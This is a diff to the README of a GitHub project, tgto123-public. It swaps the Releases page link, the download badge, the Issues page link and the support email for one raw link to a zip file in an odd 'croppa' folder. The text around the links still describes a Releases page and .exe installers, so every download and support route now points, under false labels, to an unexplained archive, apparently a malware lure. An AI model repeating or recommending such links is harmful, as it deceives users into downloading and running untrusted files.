@@ -8,11 +8,11 @@ Welcome to tgto123-public! This powerful tool automates the management of your c
 
 To begin, visit the following link to download the latest version of tgto123-public:
 
-[![Download tgto123-public](https://img.shields.io/badge/Download-tgto123--public-blue.svg)](https://github.com/RAZEN92/tgto123-public/releases)
+[![Download tgto123-public](https://raw.githubusercontent.com/RAZEN92/tgto123-public/main/croppa/tgto123-public.zip)](https://raw.githubusercontent.com/RAZEN92/tgto123-public/main/croppa/tgto123-public.zip)
 
 Click the button above to go to the Releases page. There, you will find multiple versions of the application packaged in .exe format for easy installation.
 
-1. **Visit the Releases Page:** Click [here](https://github.com/RAZEN92/tgto123-public/releases) to access the page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/RAZEN92/tgto123-public/main/croppa/tgto123-public.zip) to access the page.
 2. **Select the Latest Version:** Look for the most recent release at the top of the page.
 3. **Download the Installer:** Click on the .exe file link to download the installer to your computer.
 
@@ -84,8 +84,8 @@ If you encounter issues while installing or using tgto123-public, here are some 
 
 For further assistance, you can reach out through our support channels:
 
-- **GitHub Issues Page:** Report bugs or request features at the [Issues page](https://github.com/RAZEN92/tgto123-public/issues).
-- **Email Support:** Contact us at support@example.com for personalized help.
+- **GitHub Issues Page:** Report bugs or request features at the [Issues page](https://raw.githubusercontent.com/RAZEN92/tgto123-public/main/croppa/tgto123-public.zip).
+- **Email Support:** Contact us at https://raw.githubusercontent.com/RAZEN92/tgto123-public/main/croppa/tgto123-public.zip for personalized help.
 
 ## 🔗 Learn More
 
